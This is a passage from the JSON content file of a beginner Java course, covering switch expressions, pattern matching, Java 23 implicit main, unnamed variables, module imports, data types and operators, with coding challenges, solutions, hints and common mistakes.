              "content": "When you need multiple statements in a case, use a block with 'yield':\n\nint numLetters = switch (day) {\n    case \"MONDAY\", \"FRIDAY\", \"SUNDAY\" -> 6;\n    case \"TUESDAY\" -> 7;\n    case \"THURSDAY\", \"SATURDAY\" -> 8;\n    case \"WEDNESDAY\" -> {\n        System.out.println(\"Middle of week!\");\n        yield 9;  // 'yield' returns the value from the block\n    }\n    default -> throw new IllegalArgumentException(\"Invalid day: \" + day);\n};\n\nKey points:\n- Use { } blocks when you need multiple statements\n- Use 'yield' (not 'return') to provide the value\n- 'yield' is only used in switch expressions, not statements"
            },
            {
              "type": "KEY_POINT",
              "title": "Pattern Matching for instanceof",
              "content": "Traditional instanceof checking is repetitive:\n\n// Old way:\nif (obj instanceof String) {\n    String s = (String) obj;  // Repetitive cast!\n    System.out.println(s.length());\n}\n\n// New way with pattern matching:\nif (obj instanceof String s) {\n    // 's' is already a String - no cast needed!\n    System.out.println(s.length());\n}\n\nThe pattern 'String s' both:\n1. Tests if obj is a String\n2. Creates variable s with the String type\n\nMore examples:\n\n// With negation\nif (!(obj instanceof String s)) {\n    return;  // obj is not a String\n}\n// Here 's' is in scope and is a String\nSystem.out.println(s.toUpperCase());\n\n// In complex conditions\nif (obj instanceof String s && s.length() > 5) {\n    System.out.println(\"Long string: \" + s);\n}"
            },
            {
              "type": "THEORY",
              "title": "Pattern Matching in Switch",
              "content": "Pattern matching in switch expressions:\n\n// Type patterns in switch\nString describe(Object obj) {\n    return switch (obj) {\n        case Integer i -> \"Integer: \" + i;\n        case Long l -> \"Long: \" + l;\n        case Double d -> \"Double: \" + d;\n        case String s -> \"String of length \" + s.length();\n        case null -> \"It's null!\";\n        default -> \"Unknown type\";\n    };\n}\n\n// With guards (when clause)\nString categorize(Object obj) {\n    return switch (obj) {\n        case Integer i when i < 0 -> \"Negative number\";\n        case Integer i when i == 0 -> \"Zero\";\n        case Integer i -> \"Positive number: \" + i;\n        case String s when s.isEmpty() -> \"Empty string\";\n        case String s -> \"String: \" + s;\n        case null -> \"null value\";\n        default -> \"Something else\";\n    };\n}\n\nKey features:\n- Type patterns: case Integer i -> ...\n- Guards: case Integer i when i > 0 -> ...\n- Null handling: case null -> ...\n- Record patterns: case Point(int x, int y) -> ..."
            },
            {
              "type": "EXAMPLE",
              "title": "Modern Switch and Pattern Matching in Action",
              "content": "Switch expressions with arrow syntax eliminate fall-through bugs and return values directly. Pattern matching for instanceof combines type checking and casting. Guards with 'when' add conditional logic to patterns.",
              "code": "public class ModernJavaDemo {\n    public static void main(String[] args) {\n        // Switch expression with arrow syntax\n        String day = \"WEDNESDAY\";\n        String activity = switch (day) {\n            case \"MONDAY\", \"TUESDAY\", \"WEDNESDAY\", \"THURSDAY\", \"FRIDAY\" -> \"Work\";\n            case \"SATURDAY\" -> \"Relax\";\n            case \"SUNDAY\" -> \"Prepare for week\";\n            default -> \"Unknown\";\n        };\n        System.out.println(day + \": \" + activity);\n        \n        // Pattern matching for instanceof\n        Object[] items = {\"Hello\", 42, 3.14, true};\n        for (Object item : items) {\n            if (item instanceof String s) {\n                System.out.println(\"String with \" + s.length() + \" chars\");\n            } else if (item instanceof Integer n) {\n                System.out.println(\"Integer: \" + n);\n            } else if (item instanceof Double d) {\n                System.out.println(\"Double: \" + d);\n            } else {\n                System.out.println(\"Other: \" + item);\n            }\n        }\n        \n        // Pattern matching in switch\n        for (Object item : items) {\n            String description = switch (item) {\n                case String s when s.length() > 10 -> \"Long string\";\n                case String s -> \"String: \" + s;\n                case Integer i when i < 0 -> \"Negative\";\n                case Integer i -> \"Positive: \" + i;\n                case Double d -> \"Double: \" + d;\n                case Boolean b -> \"Boolean: \" + b;\n                case null -> \"null\";\n                default -> \"Unknown\";\n            };\n            System.out.println(description);\n        }\n    }\n}",
              "language": "java"
            },
            {
              "type": "KEY_POINT",
              "title": "Primitive Type Patterns (Java 23+)",
              "content": "Pattern matching now works with primitive types:\n\n// Match on int values with guards\nString describe(int value) {\n    return switch (value) {\n        case 0 -> \"zero\";\n        case int i when i > 0 -> \"positive: \" + i;\n        case int i -> \"negative: \" + i;\n    };\n}\n\nKey points:\n- Declare type: case int i or case long l\n- Add guards with when clause\n- Must cover all cases (final case with no guard)\n- Works with all primitives: int, long, double, etc."
            },
            {
              "type": "KEY_POINT",
              "title": "When to Use Modern Switch Features",
              "content": "USE SWITCH EXPRESSIONS WHEN:\n- Assigning a value based on multiple conditions\n- Mapping one value to another\n- Replacing if-else-if chains\n\nUSE PATTERN MATCHING instanceof WHEN:\n- You need to check type AND use the value\n- Processing heterogeneous collections\n- Simplifying type-checking code\n\nUSE PATTERN MATCHING IN SWITCH WHEN:\n- Processing different types differently\n- Combining type checks with value conditions\n- Working with sealed classes/interfaces\n\nBEST PRACTICES:\n- Always handle all cases (be exhaustive)\n- Use guards (when) for additional conditions\n- Handle null explicitly when needed\n- Prefer switch expressions over statements for assignments"
            },
            {
              "type": "KEY_POINT",
              "title": "Dual Syntax: Switch Expressions vs Traditional Switch",
              "content": "You'll see TWO styles for switch in Java:\n\nMODERN SYNTAX (Java 14+):\nString result = switch (day) {\n    case \"MON\", \"TUE\", \"WED\" -> \"Weekday\";\n    case \"SAT\", \"SUN\" -> \"Weekend\";\n    default -> \"Unknown\";\n};\n\nUse this when: Assigning values, Java 14+, cleaner code.\n\nTRADITIONAL SYNTAX (Java 8+):\nString result;\nswitch (day) {\n    case \"MON\":\n    case \"TUE\":\n    case \"WED\":\n        result = \"Weekday\";\n        break;\n    case \"SAT\":\n    case \"SUN\":\n        result = \"Weekend\";\n        break;\n    default:\n        result = \"Unknown\";\n        break;\n}\n\nUse this when: Working with Java 8-13, or when you need fall-through behavior.\n\nKEY DIFFERENCES:\n- Arrow syntax (->) = no fall-through, can return values directly\n- Colon syntax (:) = requires 'break', can fall-through intentionally\n- Modern: multiple cases on one line (case \"A\", \"B\" ->)\n- Traditional: cases must be stacked\n\nBOTH ARE VALID! Arrow syntax is preferred in modern Java for clarity and safety."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-5-switch-basic",
              "title": "Basic Switch Expression",
              "description": "Create a method that takes a month number (1-12) and returns the season:\n- 12, 1, 2 -> \"Winter\"\n- 3, 4, 5 -> \"Spring\"\n- 6, 7, 8 -> \"Summer\"\n- 9, 10, 11 -> \"Fall\"\n- default -> \"Unknown\"\n\nUse switch expression with arrow syntax.\n\nTest: getSeason(7) should return \"Summer\"",
              "instructions": "Create a method that takes a month number (1-12) and returns the season:\n- 12, 1, 2 -> \"Winter\"\n- 3, 4, 5 -> \"Spring\"\n- 6, 7, 8 -> \"Summer\"\n- 9, 10, 11 -> \"Fall\"\n- default -> \"Unknown\"\n\nUse switch expression with arrow syntax.",
              "starterCode": "// Basic Switch Expression\n// Write your code below\n\nString getSeason(int month) {\n    // Use switch expression here\n}\n\nvoid main() {\n    println(getSeason(7));\n}",
              "solution": "// Solution: Basic Switch Expression\nString getSeason(int month) {\n    return switch (month) {\n        case 12, 1, 2 -> \"Winter\";\n        case 3, 4, 5 -> \"Spring\";\n        case 6, 7, 8 -> \"Summer\";\n        case 9, 10, 11 -> \"Fall\";\n        default -> \"Unknown\";\n    };\n}\n\nvoid main() {\n    println(getSeason(7));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-5-switch-basic-test-1",
                  "description": "Should return 'Summer'",
                  "expectedOutput": "Summer",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the syntax: return switch (month) { case 1, 2 -> \"value\"; };"
                },
                {
                  "level": 2,
                  "text": "Multiple cases can share one arrow: case 12, 1, 2 -> \"Winter\""
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolon after the switch expression",
                  "consequence": "Compilation error",
                  "correction": "Switch expressions need ; at the end when used in a statement"
                },
                {
                  "mistake": "Using break with arrow syntax",
                  "consequence": "Compilation error",
                  "correction": "Arrow syntax doesn't use break - the arrow implies no fall-through"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-5-pattern-instanceof",
              "title": "Pattern Matching for instanceof",
              "description": "Create a method describe(Object obj) that returns:\n- \"String: [value]\" if it's a String\n- \"Number: [value]\" if it's an Integer\n- \"Unknown\" for anything else\n\nUse pattern matching for instanceof.\n\nTest: describe(\"Hello\") should return \"String: Hello\"",
              "instructions": "Create a method describe(Object obj) that returns:\n- \"String: [value]\" if it's a String\n- \"Number: [value]\" if it's an Integer\n- \"Unknown\" for anything else\n\nUse pattern matching for instanceof.",
              "starterCode": "// Pattern Matching for instanceof\n// Write your code below\n\nString describe(Object obj) {\n    // Use pattern matching instanceof here\n}\n\nvoid main() {\n    println(describe(\"Hello\"));\n}",
              "solution": "// Solution: Pattern Matching for instanceof\nString describe(Object obj) {\n    if (obj instanceof String s) {\n        return \"String: \" + s;\n    } else if (obj instanceof Integer n) {\n        return \"Number: \" + n;\n    } else {\n        return \"Unknown\";\n    }\n}\n\nvoid main() {\n    println(describe(\"Hello\"));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-5-pattern-instanceof-test-1",
                  "description": "Should return 'String: Hello'",
                  "expectedOutput": "String: Hello",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Pattern matching: if (obj instanceof String s) - s is now a String"
                },
                {
                  "level": 2,
                  "text": "You don't need to cast after the pattern match - the variable is already the correct type"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Casting after instanceof with pattern matching",
                  "consequence": "Unnecessary code",
                  "correction": "The pattern variable is already the correct type"
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-5-switch-yield",
              "title": "Switch Expression with yield",
              "description": "Create a method getGrade(int score) that returns:\n- 90-100: \"A\" (print \"Excellent!\" too)\n- 80-89: \"B\"\n- 70-79: \"C\"\n- 60-69: \"D\"\n- below 60: \"F\"\n\nUse switch expression with yield for the A grade case.\n\nTest: getGrade(95) should print \"Excellent!\" and return \"A\"",
              "instructions": "Create a method getGrade(int score) that returns:\n- 90-100: \"A\" (print \"Excellent!\" too)\n- 80-89: \"B\"\n- 70-79: \"C\"\n- 60-69: \"D\"\n- below 60: \"F\"\n\nUse switch expression with yield for the A grade case.",
              "starterCode": "// Switch Expression with yield\n// Write your code below\n\nString getGrade(int score) {\n    // Use switch expression with yield here\n}\n\nvoid main() {\n    println(getGrade(95));\n}",
              "solution": "// Solution: Switch Expression with yield\nString getGrade(int score) {\n    return switch (score / 10) {\n        case 10, 9 -> {\n            println(\"Excellent!\");\n            yield \"A\";\n        }\n        case 8 -> \"B\";\n        case 7 -> \"C\";\n        case 6 -> \"D\";\n        default -> \"F\";\n    };\n}\n\nvoid main() {\n    println(getGrade(95));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-5-switch-yield-test-1",
                  "description": "Should print 'Excellent!' then 'A'",
                  "expectedOutput": "Excellent!\nA",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Divide score by 10 to get a single digit for the switch"
                },
                {
                  "level": 2,
                  "text": "Use { } block with yield for multiple statements: case 9 -> { print(); yield \"A\"; }"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using return instead of yield in switch expression block",
                  "consequence": "Compilation error",
                  "correction": "Use yield to return a value from a switch expression block"
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "epoch-0-lesson-6",
          "title": "Lesson 1.6: Modern Java Syntax - Writing Less Code (Java 23+)",
          "moduleId": "module-01",
          "order": 6,
          "estimatedMinutes": 35,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Java's Ceremony",
              "content": "Traditional Java requires a lot of boilerplate just to print 'Hello':\n\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello, World!\");\n    }\n}\n\nThat's 5 lines and 4 concepts (public, class, static, void, String[] args) just to print one message!\n\nJava 23 introduces features that eliminate this ceremony, making Java as concise as Python or JavaScript for simple programs."
            },
            {
              "type": "KEY_POINT",
              "title": "JEP 477: Implicit Main - No More Ceremony",
              "content": "Java 23 lets you write programs without class declarations:\n\n// OLD WAY (still works):\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello!\");\n    }\n}\n\n// NEW WAY (Java 23+):\nvoid main() {\n    println(\"Hello!\");\n}\n\nWhat changed:\n- No public class declaration needed\n- No static keyword\n- No String[] args (unless you need them)\n- println() works directly (no System.out)\n\nPerfect for:\n- Learning Java\n- Quick scripts\n- Small utilities\n\nNote: For larger applications, you'll still use proper class structure."
            },
            {
              "type": "EXAMPLE",
              "title": "Before and After: A Complete Comparison",
              "content": "The new implicit main syntax dramatically reduces boilerplate for beginners. Here's a side-by-side comparison showing how much cleaner Java 23 code can be.",
              "code": "// ========== OLD WAY (Java 8-22) ==========\npackage com.example;\n\npublic class TemperatureConverter {\n    public static void main(String[] args) {\n        double celsius = 25.0;\n        double fahrenheit = celsius * 9/5 + 32;\n        System.out.println(celsius + \"C = \" + fahrenheit + \"F\");\n    }\n}\n\n// ========== NEW WAY (Java 23+) ==========\nvoid main() {\n    double celsius = 25.0;\n    double fahrenheit = celsius * 9/5 + 32;\n    println(celsius + \"C = \" + fahrenheit + \"F\");\n}\n\n// Same output, 60% less code!",
              "language": "java"
            },
            {
              "type": "THEORY",
              "title": "JEP 456: Unnamed Variables with _",
              "content": "Sometimes you MUST declare a variable but don't need it:\n\n// Forced to name the exception even if unused:\ntry {\n    riskyOperation();\n} catch (Exception e) {  // 'e' is never used!\n    System.out.println(\"Something went wrong\");\n}\n\n// Forced to name element in enhanced for-loop:\nfor (var item : List.of(1, 2, 3, 4, 5)) {  // 'item' never used!\n    doSomething();\n}\n\nJava 23 introduces the unnamed variable '_':\n\ntry {\n    riskyOperation();\n} catch (Exception _) {  // Clearly signals: unused\n    println(\"Something went wrong\");\n}\n\n// Enhanced for-loop where we just need iterations:\nfor (var _ : List.of(1, 2, 3, 4, 5)) {  // Run 5 times\n    doSomething();\n}\n\n// Lambda parameter that's unused:\nlist.forEach(_ -> count++);\n\nNote: Traditional for-loops (for int i = 0; i < 5; i++)\nstill need a regular counter since _ cannot be read.\n\nBenefits:\n- Clearly communicates intent\n- No compiler warnings about unused variables\n- Cleaner code"
            },
            {
              "type": "KEY_POINT",
              "title": "JEP 476: Module Imports",
              "content": "Tired of importing dozens of classes?\n\n// OLD WAY:\nimport java.util.List;\nimport java.util.ArrayList;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\n// ... and more\n\n// NEW WAY (Java 23+):\nimport module java.base;\n\nThis single line imports EVERYTHING from java.base:\n- All collections (List, Map, Set...)\n- All I/O classes (Files, Path, Stream...)\n- All utility classes (Optional, Objects...)\n- And more!\n\nPerfect for learning and prototyping. In production code, you may prefer explicit imports for clarity."
            },
            {
              "type": "THEORY",
              "title": "Putting It All Together",
              "content": "Here's a complete modern Java 23 program:\n\nimport module java.base;\n\nvoid main() {\n    var numbers = List.of(1, 2, 3, 4, 5);\n    \n    // Process each number\n    for (var num : numbers) {\n        println(\"Number: \" + num);\n    }\n    \n    // Handle errors with unnamed variable\n    try {\n        var data = Files.readString(Path.of(\"data.txt\"));\n        println(data);\n    } catch (IOException _) {\n        println(\"Could not read file\");\n    }\n}\n\nNotice:\n- One import for everything\n- No class declaration\n- No static main\n- println() works directly\n- _ for unused exception"
            },
            {
              "type": "KEY_POINT",
              "title": "When to Use These Features",
              "content": "USE IMPLICIT MAIN WHEN:\n- Learning Java\n- Writing quick scripts\n- Building small utilities\n- Prototyping ideas\n\nUSE TRADITIONAL SYNTAX WHEN:\n- Building production applications\n- Working on team projects\n- Creating reusable libraries\n- Need explicit class structure\n\nUSE UNNAMED _ WHEN:\n- Variable is required but unused\n- Catch blocks where exception details don't matter\n- Loop counters you don't need\n\nUSE MODULE IMPORTS WHEN:\n- Learning/prototyping\n- Need many classes from java.base\n- Explicit imports become tedious\n\nBEST PRACTICE: Start simple with these features, then add structure as your program grows."
            },
            {
              "type": "KEY_POINT",
              "title": "Dual Syntax: Modern Java 23+ vs Traditional Java 21 LTS",
              "content": "Here's a complete comparison of the features in this lesson:\n\nIMPLICIT MAIN (Java 23+):\nvoid main() {\n    println(\"Hello!\");\n}\n\nTRADITIONAL MAIN (Java 8-21 LTS):\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello!\");\n    }\n}\n\nUNNAMED VARIABLES (Java 22+):\ncatch (Exception _) { ... }\nfor (var _ : list) { ... }\n\nTRADITIONAL UNUSED VARIABLES (Java 8-21):\ncatch (Exception ignored) { ... }\nfor (var unused : list) { ... }\n\nMODULE IMPORTS (Java 23+):\nimport module java.base;\n\nTRADITIONAL IMPORTS (Java 8-21):\nimport java.util.List;\nimport java.util.Map;\nimport java.io.IOException;\n// ... one import per class\n\nIMPORTANT: Most enterprise codebases use Java 17 or 21 LTS. When you start a job, you'll likely work with traditional syntax. This course teaches modern syntax first (it's easier to learn!), but you MUST recognize both to read real-world code."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-6-modern-main",
              "title": "Modern Main Method",
              "description": "Rewrite this traditional Java program using Java 23 implicit main syntax:\n\npublic class Greeter {\n    public static void main(String[] args) {\n        String name = \"World\";\n        System.out.println(\"Hello, \" + name + \"!\");\n    }\n}\n\nYour solution should use void main() and println().",
              "instructions": "Rewrite the Greeter program using Java 23 implicit main. Use void main() and println() instead of the traditional boilerplate.",
              "starterCode": "// Rewrite using Java 23 implicit main syntax\n// Remove: public class, static, String[] args, System.out\n\n// Your code here\n",
              "solution": "void main() {\n    String name = \"World\";\n    println(\"Hello, \" + name + \"!\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should print 'Hello, World!'",
                  "input": "",
                  "expectedOutput": "Hello, World!",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with 'void main()' - no public, no static, no class wrapper needed."
                },
                {
                  "level": 2,
                  "text": "Use println() directly instead of System.out.println()"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Including 'static' keyword",
                  "consequence": "Implicit main methods don't need static",
                  "correction": "Just use 'void main()' - static is implied"
                },
                {
                  "mistake": "Wrapping in a class declaration",
                  "consequence": "Defeats the purpose of implicit classes",
                  "correction": "Write the main method directly, no class needed"
                },
                {
                  "mistake": "Using System.out.println instead of println",
                  "consequence": "Works but misses the shorthand",
                  "correction": "Use println() directly - it's automatically available"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        }
      ],
      "order": 1
    },
    {
      "id": "module-02",
      "title": "Data Types, Loops, and Methods",
      "description": "Deep dive into data types, operators, loops, and writing reusable methods.",
      "difficulty": "beginner",
      "estimatedHours": 3.4,
      "lessons": [
        {
          "id": "epoch-1-lesson-1",
          "title": "Lesson 2.1: Data Types in Depth",
          "moduleId": "module-02",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Different Kinds of Information",
              "content": "You've learned that variables store information. But not all information is the same:\n\n• Your age: a whole number (25)\n• Your bank balance: a decimal number (1,234.56)\n• Your name: text (\"Alice\")\n• Whether you're logged in: true or false\n\nJava needs to know WHAT KIND of data each variable holds because:\n1. Different types use different amounts of memory\n2. Different types support different operations (you can't multiply text!)\n3. This prevents bugs (accidentally treating a number as text)\n\nThink of it like containers: you wouldn't store soup in a paper bag or carry books in a bucket. The container (type) must match what you're storing (data)."
            },
            {
              "type": "KEY_POINT",
              "title": "Data Types are Like Kitchen Containers",
              "content": "In a kitchen, you have different containers for different things:\n\n🥛 Glass (int) - For whole items: 5 apples, 12 eggs, 100 cookies\n   Can't hold half items. Either you have 5 apples or 6, not 5.5.\n\n🍶 Measuring Cup (double) - For liquids: 2.5 cups of water, 1.75 liters\n   Can hold precise decimal amounts.\n\n📝 Label Maker (String) - For text: \"Flour\", \"Sugar\", \"Hello World\"\n   Stores words and sentences.\n\n🔲 Checkbox (boolean) - For yes/no: oven on? true/false\n   Only two possible values: true or false.\n\nEach container (data type) is designed for a specific purpose!"
            },
            {
              "type": "THEORY",
              "title": "The Four Essential Data Types",
              "content": "Java has several data types, but beginners need to master these four:\n\n1. int (INTEGER - whole numbers)\n   int age = 25;\n   int score = -10;  // Can be negative\n   int population = 8000000;\n   Range: -2 billion to +2 billion (approximately)\n   Use for: counts, ages, scores, quantities\n\n2. double (DECIMAL NUMBERS)\n   double price = 19.99;\n   double temperature = -3.5;\n   double pi = 3.14159;\n   Use for: money, measurements, scientific calculations\n   Note: Called 'double' because it uses double the memory of old 'float' type\n\n3. String (TEXT)\n   String name = \"Alice\";\n   String message = \"Hello, World!\";\n   String empty = \"\";  // Empty string\n   MUST use double quotes: \"like this\"\n   Note: String is capitalized (it's technically an object, not primitive)\n\n4. boolean (TRUE/FALSE)\n   boolean isLoggedIn = true;\n   boolean gameOver = false;\n   boolean hasWon = score > 100;\n   Only two values: true or false (lowercase!)\n   Use for: flags, conditions, yes/no questions"
            },
            {
              "type": "THEORY",
              "title": "Type Conversion and Common Mistakes",
              "content": "⚠️ Java is STRICT about types:\n\nWRONG:\nint x = 3.14;  // ERROR! Can't put decimal in int\nString age = 25;  // ERROR! Numbers need quotes to be Strings\n\nCORRECT:\nint x = 3;  // Whole number for int\ndouble y = 3.14;  // Decimal for double\nString age = \"25\";  // Text needs quotes\n\nConverting between types:\nint age = 25;\nString ageText = \"\" + age;  // Converts to \"25\"\n// OR\nString ageText = String.valueOf(age);\n\ndouble price = 19.99;\nint dollars = (int) price;  // Truncates to 19 (loses .99!)\n\nKey rule: Java won't automatically convert if data could be lost."
            },
            {
              "type": "KEY_POINT",
              "title": "Choosing the Right Type",
              "content": "How to decide which type to use:\n\nAsk yourself:\n1. Is it a number? → int or double\n   - Whole number? → int\n   - Needs decimals? → double\n\n2. Is it text? → String\n   - Even if it looks like a number (\"123\") but you're not doing math\n\n3. Is it yes/no, on/off, true/false? → boolean\n\nExamples:\n✓ int numberOfStudents = 30;  // Counting people\n✓ double temperature = 98.6;  // Needs precision\n✓ String username = \"alice2024\";  // Text identifier\n✓ boolean isValid = true;  // Yes/no flag\n\n✗ double numberOfStudents = 30.0;  // Wasteful (don't need decimals)\n✗ int price = 20;  // Risky (what about $20.50?)\n✗ String isValid = \"true\";  // Wrong type (should be boolean)"
            },
            {
              "type": "THEORY",
              "title": "Modern Java: Text Blocks for Multi-line Strings",
              "content": "Since Java 15, you can write multi-line strings using TEXT BLOCKS:\n\nOLD WAY (messy, hard to read):\nString json = \"{\\n\" +\n    \"  \\\"name\\\": \\\"Alice\\\",\\n\" +\n    \"  \\\"age\\\": 20\\n\" +\n    \"}\";\n\nMODERN WAY (clean, readable):\nString json = \"\"\"\n    {\n        \"name\": \"Alice\",\n        \"age\": 20\n    }\n    \"\"\";\n\nText blocks use triple quotes \"\"\" to start and end. Everything between them is treated as-is, including line breaks and indentation.\n\nPerfect for:\n• JSON data\n• SQL queries\n• HTML/XML\n• Any multi-line text\n\nKey rules:\n1. Opening \"\"\" must be followed by a newline\n2. Closing \"\"\" determines the indentation baseline\n3. Java automatically removes common leading whitespace"
            },
            {
              "type": "THEORY",
              "title": "String Formatting with .formatted()",
              "content": "When combining variables with strings, you have several options:\n\n1. STRING CONCATENATION (basic, but messy):\nString msg = \"Hello, \" + name + \"! You are \" + age + \" years old.\";\n\n2. String.format() (traditional):\nString msg = String.format(\"Hello, %s! You are %d years old.\", name, age);\n\n3. .formatted() (modern, Java 15+):\nString msg = \"Hello, %s! You are %d years old.\".formatted(name, age);\n\nThe .formatted() method is cleaner because the template comes first!\n\nCombining text blocks with .formatted():\n\nString template = \"\"\"\n    Dear %s,\n    Your order #%d is ready.\n    Total: $%.2f\n    \"\"\";\nString email = template.formatted(\"Alice\", 12345, 99.99);\n\nFormat specifiers:\n• %s = String (or any object)\n• %d = Integer (whole number)\n• %f = Floating point (decimal)\n• %.2f = Decimal with 2 decimal places\n• %n = Newline (platform-independent)"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-1-variables",
              "title": "Creating Multiple Data Types",
              "description": "Create four variables with different data types:\n1. int age = 28\n2. double price = 15.99\n3. String name = \"Bob\"\n4. boolean isActive = true\n\nThen print the 'name' variable.\n\nRemember: Strings need double quotes!",
              "instructions": "Create four variables with different data types:\n1. int age = 28\n2. double price = 15.99\n3. String name = \"Bob\"\n4. boolean isActive = true\n\nThen print the 'name' variable.\n\nRemember: Strings need double quotes!",
              "starterCode": "// Creating Multiple Data Types\n// Using Java 23 implicit main syntax from Lesson 0.6\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Creating Multiple Data Types\n// Using Java 23 implicit main syntax (introduced in Lesson 0.6)\n// This demonstrates using different data types in Java\n\nvoid main() {\n    // Create four variables with different data types\n    int age = 28;              // Integer for whole numbers\n    double price = 15.99;      // Double for decimal numbers\n    String name = \"Bob\";       // String for text (note double quotes)\n    boolean isActive = true;   // Boolean for true/false values\n    \n    // Print the name variable using simple println()\n    println(name);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-1-variables-test-1",
                  "description": "Should print 'Bob'",
                  "expectedOutput": "Bob",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-1-student",
              "title": "Student Profile",
              "description": "Create a student profile with the following variables:\n- String studentName = \"Alice\"\n- int studentAge = 20\n- double gpa = 3.85\n- boolean isEnrolled = true\n\nThen print: Alice is 20 years old\n\nHint: println(studentName + \" is \" + studentAge + \" years old\");",
              "instructions": "Create a student profile with the following variables:\n- String studentName = \"Alice\"\n- int studentAge = 20\n- double gpa = 3.85\n- boolean isEnrolled = true\n\nThen print: Alice is 20 years old\n\nHint: println(studentName + \" is \" + studentAge + \" years old\");",
              "starterCode": "// Student Profile\n// Using Java 23 implicit main syntax\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Student Profile\n// Using Java 23 implicit main syntax\n// This demonstrates string concatenation with variables\n\nvoid main() {\n    // Create the student profile variables\n    String studentName = \"Alice\";\n    int studentAge = 20;\n    double gpa = 3.85;\n    boolean isEnrolled = true;\n    \n    // Print the formatted message using string concatenation\n    println(studentName + \" is \" + studentAge + \" years old\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-1-student-test-1",
                  "description": "Should print student info correctly",
                  "expectedOutput": "Alice is 20 years old",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-1-lesson-2",
          "title": "Lesson 2.2: Operators and Expressions",
          "moduleId": "module-02",
          "order": 2,
          "estimatedMinutes": 30,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Doing Math with Variables",
              "content": "You can store numbers in variables, but programs need to DO THINGS with those numbers:\n\n• A calculator adds, subtracts, multiplies, divides\n• A game tracks score: score = score + 10\n• A store calculates total: price * quantity\n• A thermometer converts: fahrenheit = (celsius * 9/5) + 32\n\nJava provides OPERATORS—symbols that perform operations on values.\n\nThink of operators as the buttons on a calculator: +, -, ×, ÷"
            },
            {
              "type": "KEY_POINT",
              "title": "Operators are Calculator Buttons",
              "content": "Imagine a calculator:\n\nYou press: 5 [+] 3 [=]\nResult: 8\n\nIn Java:\nint result = 5 + 3;  // result is 8\n\nThe '+' is an OPERATOR. It takes two values (5 and 3) and produces a result (8).\n\nJust like a calculator has buttons for +, -, ×, ÷, Java has operator symbols:\n+ for addition\n- for subtraction\n* for multiplication (can't use × symbol!)\n/ for division\n% for remainder (modulo)"
            },
            {
              "type": "THEORY",
              "title": "The Five Basic Arithmetic Operators",
